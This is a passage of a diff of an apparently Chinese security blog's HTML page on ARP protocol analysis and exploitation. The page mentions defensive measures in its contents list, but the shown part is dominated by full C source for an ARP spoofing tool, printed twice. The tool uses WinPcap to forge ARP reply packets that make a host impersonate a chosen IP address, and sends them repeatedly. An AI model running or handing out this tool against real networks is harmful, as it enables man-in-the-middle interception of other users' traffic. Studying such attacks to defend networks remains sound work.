<span class="keyword">unsigned</span> <span class="keyword">long</span> ul_dest_ip = <span class="number">0u</span>;</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Input the src ip(192.168.1.1):"</span>);</span><br><span class="line">	gets_s(chs_src_ip);</span><br><span class="line">	</span><br><span class="line">	ul_src_ip = inet_addr(chs_src_ip);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Input the dest ip(192.168.1.100):"</span>);</span><br><span class="line">	gets_s(chs_dest_ip);</span><br><span class="line">	ul_dest_ip = inet_addr(chs_dest_ip);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> uchs_src_mac[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> uchs_dest_mac[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Input source mac address(30 AD 23 A3 FC CD):"</span>);</span><br><span class="line">	scanf_s(<span class="string">"%x%x%x%x%x%x"</span>, &amp;uchs_src_mac[<span class="number">0</span>], &amp;uchs_src_mac[<span class="number">1</span>], &amp;uchs_src_mac[<span class="number">2</span>],</span><br><span class="line">		&amp;uchs_src_mac[<span class="number">3</span>], &amp;uchs_src_mac[<span class="number">4</span>], &amp;uchs_src_mac[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Input dest mac address(30 AD 23 A3 FC CD):"</span>);</span><br><span class="line">	scanf_s(<span class="string">"%x%x%x%x%x%x"</span>, &amp;uchs_dest_mac[<span class="number">0</span>], &amp;uchs_dest_mac[<span class="number">1</span>], &amp;uchs_dest_mac[<span class="number">2</span>],</span><br><span class="line">		&amp;uchs_dest_mac[<span class="number">3</span>], &amp;uchs_dest_mac[<span class="number">4</span>], &amp;uchs_dest_mac[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Input send times:"</span>);</span><br><span class="line">	scanf_s(<span class="string">"%d"</span>, &amp;times);</span><br><span class="line">	packet = BuildArpPacket(uchs_src_mac, uchs_dest_mac, ul_src_ip, ul_dest_ip);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 打开网卡 */</span></span><br><span class="line">	<span class="keyword">if</span> ((adhandle = pcap_open(device-&gt;name,          <span class="comment">// name of the device</span></span><br><span class="line">		<span class="number">65536</span>,            <span class="comment">// portion of the packet to capture</span></span><br><span class="line">		<span class="number">0</span>,                <span class="comment">//open flag</span></span><br><span class="line">		<span class="number">1000</span>,             <span class="comment">// read timeout</span></span><br><span class="line">		NULL,             <span class="comment">// authentication on the remote machine</span></span><br><span class="line">		errbuf            <span class="comment">// error buffer</span></span><br><span class="line">		)) == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nUnable to open the adapter. %s is not supported by WinPcap\n"</span>,</span><br><span class="line">			device-&gt;name);</span><br><span class="line">		<span class="comment">/* Free the device list */</span></span><br><span class="line">		pcap_freealldevs(alldevs);</span><br><span class="line">		return <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//构建假的ARP请求包，达到本机伪装成给定的IP地址的目的</span></span><br><span class="line">	packet = BuildArpPacket(uchs_src_mac, uchs_dest_mac, ul_src_ip, ul_dest_ip);</span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (j &lt;= times)</span><br><span class="line">	&#123;</span><br><span class="line">		pcap_sendpacket(adhandle, packet, <span class="number">60</span>);</span><br><span class="line">		Sleep(<span class="number">100</span>);		</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d:%s--&gt;%s\n"</span>,j, chs_src_ip,chs_dest_ip);</span><br><span class="line">		j++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"end!!!\n"</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="title">BuildArpPacket</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* source_mac, <span class="keyword">unsigned</span> <span class="keyword">char</span>* dest_mac,</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> src_ip, <span class="keyword">unsigned</span> <span class="keyword">long</span> dest_ip)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">struct</span> arp_packet packet;</span><br><span class="line">	<span class="built_in">memcpy</span>(packet.eth.dest_mac, dest_mac, <span class="number">6</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(packet.eth.source_mac, source_mac, <span class="number">6</span>);</span><br><span class="line">	packet.eth.eh_type = htons(<span class="number">0x0806</span>);</span><br><span class="line"></span><br><span class="line">	packet.arp.hardware_type = htons(<span class="number">0x0001</span>);</span><br><span class="line">	packet.arp.protocol_type = htons(<span class="number">0x0800</span>);</span><br><span class="line">	packet.arp.add_len = <span class="number">0x06</span>;</span><br><span class="line">	packet.arp.pro_len = <span class="number">0x04</span>;</span><br><span class="line">	</span><br><span class="line">	packet.arp.option = htons(<span class="number">0x0002</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(packet.arp.sour_addr, source_mac, <span class="number">6</span>);</span><br><span class="line">	packet.arp.sour_ip = src_ip;</span><br><span class="line">	<span class="built_in">memcpy</span>(packet.arp.dest_addr, dest_mac, <span class="number">6</span>);</span><br><span class="line">	packet.arp.dest_ip = dest_ip;</span><br><span class="line">	<span class="built_in">memset</span>(packet.arp.padding, <span class="number">0</span>, <span class="number">18</span>);</span><br><span class="line">	return (unsigned char*)&amp;packet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage11.png" alt="def_res" title="">
+                </div>
+                <div class="image-caption">def_res</div>
+            </figure>
+<h2 id="攻击程序代码-C语言"><a href="#攻击程序代码-C语言" class="headerlink" title="攻击程序代码(C语言)"></a>攻击程序代码(C语言)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">// ARP攻击程序源代码</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pcap.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;packet32.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddndis.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MY_ARP_CHEAT_INCLUDE_H</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_ARP_CHEAT_INCLUDE_H</span></div><div class="line"></div><div class="line"><span class="comment">//字节对齐必须是1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack (1)</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ethernet_head</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> dest_mac[<span class="number">6</span>]; <span class="comment">//目标主机MAC地址</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> source_mac[<span class="number">6</span>]; <span class="comment">//源端MAC地址</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> eh_type; <span class="comment">//以太网类型</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arp_head</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> hardware_type; <span class="comment">//硬件类型：以太网接口类型为1</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> protocol_type; <span class="comment">//协议类型：IP协议类型为0X0800</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> add_len; <span class="comment">//硬件地址长度：MAC地址长度为6B</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> pro_len; <span class="comment">//协议地址长度：IP地址长度为4B</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> option; <span class="comment">//操作：ARP请求为1，ARP应答为2</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> sour_addr[<span class="number">6</span>]; <span class="comment">//源MAC地址：发送方的MAC地址</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> sour_ip; <span class="comment">//源IP地址：发送方的IP地址</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> dest_addr[<span class="number">6</span>]; </div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> dest_ip; </div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> padding[<span class="number">18</span>];</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arp_packet</span> //最终<span class="title">arp</span>包结构</span></div><div class="line">&#123;</div><div class="line">	ethernet_head eth; <span class="comment">//以太网头部</span></div><div class="line">	arp_head arp; <span class="comment">//arp数据包头部</span></div><div class="line">&#125;;</div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack ()</span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="title">BuildArpPacket</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* source_mac, <span class="keyword">unsigned</span> <span class="keyword">char</span>* dest_mac,</span></span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> src_ip, <span class="keyword">unsigned</span> <span class="keyword">long</span> dest_ip);</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> errbuf[PCAP_ERRBUF_SIZE];   <span class="comment">//错误缓冲区</span></div><div class="line">	<span class="keyword">int</span> times;	<span class="comment">//	发送次数</span></div><div class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *packet;	<span class="comment">//ARP包</span></div><div class="line">	<span class="keyword">pcap_t</span> *adhandle;	<span class="comment">//一个pcap实例</span></div><div class="line">	<span class="keyword">pcap_if_t</span> *alldevs;	<span class="comment">//	全部网卡列表</span></div><div class="line">	<span class="keyword">pcap_if_t</span> *device;	<span class="comment">//	一个网卡</span></div><div class="line">	<span class="keyword">int</span> inum;	<span class="comment">//	用户选择的网卡序号</span></div><div class="line"></div><div class="line">	<span class="comment">//	获得本机网卡列表</span></div><div class="line">	<span class="keyword">if</span> (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, <span class="literal">NULL</span>, &amp;alldevs, errbuf) == <span class="number">-1</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error in pcap_findalldevs: %s\n"</span>, errbuf);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//	打印网卡列表</span></div><div class="line">	<span class="keyword">for</span> (device = alldevs; device; device = device-&gt;next)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d"</span>, ++i);</div><div class="line">		<span class="keyword">if</span> (device-&gt;description)</div><div class="line">			<span class="built_in">printf</span>(<span class="string">". %s\n"</span>, device-&gt;description);</div><div class="line">		<span class="keyword">else</span></div><div class="line">			<span class="built_in">printf</span>(<span class="string">". No description available\n"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//	如果没有发现网卡</span></div><div class="line">	<span class="keyword">if</span> (i == <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"\nNo interfaces found! Make sure WinPcap is installed.\n"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//	请用户选择一个网卡</span></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Enter the interface number (1-%d):"</span>, i);</div><div class="line">	scanf_s(<span class="string">"%d"</span>, &amp;inum);</div><div class="line"></div><div class="line">	<span class="comment">//	移动指针到用户选择的网卡</span></div><div class="line">	<span class="keyword">for</span> (device = alldevs, i = <span class="number">0</span>; i&lt; inum - <span class="number">1</span>; device = device-&gt;next, i++);</div><div class="line"></div><div class="line">	<span class="keyword">char</span> chs_src_ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">	<span class="keyword">char</span> chs_dest_ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ul_src_ip = <span class="number">0u</span>;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ul_dest_ip = <span class="number">0u</span>;</div><div class="line">	getchar();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Input the src ip(192.168.1.1):"</span>);</div><div class="line">	gets_s(chs_src_ip);</div><div class="line">	</div><div class="line">	ul_src_ip = inet_addr(chs_src_ip);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Input the dest ip(192.168.1.100):"</span>);</div><div class="line">	gets_s(chs_dest_ip);</div><div class="line">	ul_dest_ip = inet_addr(chs_dest_ip);</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> uchs_src_mac[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> uchs_dest_mac[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Input source mac address(30 AD 23 A3 FC CD):"</span>);</div><div class="line">	scanf_s(<span class="string">"%x%x%x%x%x%x"</span>, &amp;uchs_src_mac[<span class="number">0</span>], &amp;uchs_src_mac[<span class="number">1</span>], &amp;uchs_src_mac[<span class="number">2</span>],</div><div class="line">		&amp;uchs_src_mac[<span class="number">3</span>], &amp;uchs_src_mac[<span class="number">4</span>], &amp;uchs_src_mac[<span class="number">5</span>]);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Input dest mac address(30 AD 23 A3 FC CD):"</span>);</div><div class="line">	scanf_s(<span class="string">"%x%x%x%x%x%x"</span>, &amp;uchs_dest_mac[<span class="number">0</span>], &amp;uchs_dest_mac[<span class="number">1</span>], &amp;uchs_dest_mac[<span class="number">2</span>],</div><div class="line">		&amp;uchs_dest_mac[<span class="number">3</span>], &amp;uchs_dest_mac[<span class="number">4</span>], &amp;uchs_dest_mac[<span class="number">5</span>]);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Input send times:"</span>);</div><div class="line">	scanf_s(<span class="string">"%d"</span>, &amp;times);</div><div class="line">	packet = BuildArpPacket(uchs_src_mac, uchs_dest_mac, ul_src_ip, ul_dest_ip);</div><div class="line"></div><div class="line">	<span class="comment">/* 打开网卡 */</span></div><div class="line">	<span class="keyword">if</span> ((adhandle = pcap_open(device-&gt;name,          <span class="comment">// name of the device</span></div><div class="line">		<span class="number">65536</span>,            <span class="comment">// portion of the packet to capture</span></div><div class="line">		<span class="number">0</span>,                <span class="comment">//open flag</span></div><div class="line">		<span class="number">1000</span>,             <span class="comment">// read timeout</span></div><div class="line">		<span class="literal">NULL</span>,             <span class="comment">// authentication on the remote machine</span></div><div class="line">		errbuf            <span class="comment">// error buffer</span></div><div class="line">		)) == <span class="literal">NULL</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nUnable to open the adapter. %s is not supported by WinPcap\n"</span>,</div><div class="line">			device-&gt;name);</div><div class="line">		<span class="comment">/* Free the device list */</span></div><div class="line">		pcap_freealldevs(alldevs);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//构建假的ARP请求包，达到本机伪装成给定的IP地址的目的</span></div><div class="line">	packet = BuildArpPacket(uchs_src_mac, uchs_dest_mac, ul_src_ip, ul_dest_ip);</div><div class="line">	<span class="keyword">int</span> j = <span class="number">1</span>;</div><div class="line">	<span class="keyword">while</span> (j &lt;= times)</div><div class="line">	&#123;</div><div class="line">		pcap_sendpacket(adhandle, packet, <span class="number">60</span>);</div><div class="line">		Sleep(<span class="number">100</span>);		</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d:%s--&gt;%s\n"</span>,j, chs_src_ip,chs_dest_ip);</div><div class="line">		j++;</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"end!!!\n"</span>);</div><div class="line">	getchar();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="title">BuildArpPacket</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* source_mac, <span class="keyword">unsigned</span> <span class="keyword">char</span>* dest_mac,</span></span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> src_ip, <span class="keyword">unsigned</span> <span class="keyword">long</span> dest_ip)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">arp_packet</span> <span class="title">packet</span>;</span></div><div class="line">	<span class="built_in">memcpy</span>(packet.eth.dest_mac, dest_mac, <span class="number">6</span>);</div><div class="line">	<span class="built_in">memcpy</span>(packet.eth.source_mac, source_mac, <span class="number">6</span>);</div><div class="line">	packet.eth.eh_type = htons(<span class="number">0x0806</span>);</div><div class="line"></div><div class="line">	packet.arp.hardware_type = htons(<span class="number">0x0001</span>);</div><div class="line">	packet.arp.protocol_type = htons(<span class="number">0x0800</span>);</div><div class="line">	packet.arp.add_len = <span class="number">0x06</span>;</div><div class="line">	packet.arp.pro_len = <span class="number">0x04</span>;</div><div class="line">	</div><div class="line">	packet.arp.option = htons(<span class="number">0x0002</span>);</div><div class="line">	<span class="built_in">memcpy</span>(packet.arp.sour_addr, source_mac, <span class="number">6</span>);</div><div class="line">	packet.arp.sour_ip = src_ip;</div><div class="line">	<span class="built_in">memcpy</span>(packet.arp.dest_addr, dest_mac, <span class="number">6</span>);</div><div class="line">	packet.arp.dest_ip = dest_ip;</div><div class="line">	<span class="built_in">memset</span>(packet.arp.padding, <span class="number">0</span>, <span class="number">18</span>);</div><div class="line">	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)&amp;packet;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2016-10-27T16:58:01.850Z" itemprop="dateUpdated">2016-10-28 00:58:01</time>
+</span><br>
+
+
+        
+        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2016/10/28/ARP协议分析与漏洞利用/" target="_blank" rel="external">http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/</a>
+        
+    </div>
+    <footer>
+        <a href="http://www.evilclay.com">
+            <img src="/img/avatar.jpg" alt="Anka9080">
+            Anka9080
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ARP欺骗/">ARP欺骗</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/&title=《ARP协议分析与漏洞利用》 — Anka9080's Notes&pic=http://www.evilclay.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/&title=《ARP协议分析与漏洞利用》 — Anka9080's Notes&source=Python,渗透测试,安全研发" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ARP协议分析与漏洞利用》 — Anka9080's Notes&url=http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/&via=http://www.evilclay.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
   
-	</div>
-		<footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
+    <div class="waves-block waves-effect prev">
+      <a href="/2016/11/06/Linux的sudo权限分析小记/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Linux的sudo权限分析小记</h4>
+      </a>
+    </div>
   
-  <span></span> <a href="/tags/ARP欺骗/">ARP欺骗</a>
-  </div>
 
-</div>
-
-
-
-	<div class="article-share" id="share">
-	
-	  <div data-url="http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/" data-title="ARP协议分析与漏洞利用 | Anka9080&#39;s Notes" data-tsina="null" class="share clearfix">
-	  </div>
-	
-	</div>
-
-
-</footer>
-
-   	       
-	</article>
-	
-<nav class="article-nav clearfix">
- 
- <div class="prev" >
- <a href="/2016/11/06/Linux的sudo权限分析小记/" title="Linux的sudo权限分析小记">
-  <strong>上一篇：</strong><br/>
-  <span>
-  Linux的sudo权限分析小记</span>
-</a>
-</div>
-
-
-<div class="next">
-<a href="/2016/10/27/Windows内网渗透常用工具命令速记/"  title="Windows内网渗透常用工具命令速记">
- <strong>下一篇：</strong><br/> 
- <span>Windows内网渗透常用工具命令速记
-</span>
-</a>
-</div>
-
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2016/10/27/Windows内网渗透常用工具命令速记/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Windows内网渗透常用工具命令速记</h4>
+      </a>
+    </div>
+  
 </nav>
 
-	
-<section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2016/10/28/ARP协议分析与漏洞利用/" data-title="ARP协议分析与漏洞利用" data-url="http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/"></div>
-</section>
 
 
-</div>  
-      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
-
-  <div id="toc" class="toc-aside">
-  <strong class="toc-title">Contents</strong>
- 
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP-协议是什么"><span class="toc-number">1.</span> <span class="toc-text">ARP 协议是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP-工作流程"><span class="toc-number">2.</span> <span class="toc-text">ARP 工作流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP协议的漏洞"><span class="toc-number">3.</span> <span class="toc-text">ARP协议的漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用思路"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击Demo"><span class="toc-number">5.</span> <span class="toc-text">攻击Demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防护措施"><span class="toc-number">6.</span> <span class="toc-text">防护措施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击程序代码-C语言"><span class="toc-number">7.</span> <span class="toc-text">攻击程序代码(C语言)</span></a></li></ol>
- 
-  </div>
-
-<div id="asidepart">
-<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
-<aside class="clearfix">
-
-  
-
-  
-<div class="tagslist">
-	<p class="asidetitle">Tags</p>
-		<ul class="clearfix">
-		
-			
-				<li><a href="/tags/安全工具/" title="安全工具">安全工具<sup>5</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/Ubuntu/" title="Ubuntu">Ubuntu<sup>4</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/Python/" title="Python">Python<sup>4</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/漏洞分析/" title="漏洞分析">漏洞分析<sup>3</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/多线程/" title="多线程">多线程<sup>3</sup></a></li>
-			
-		
-			
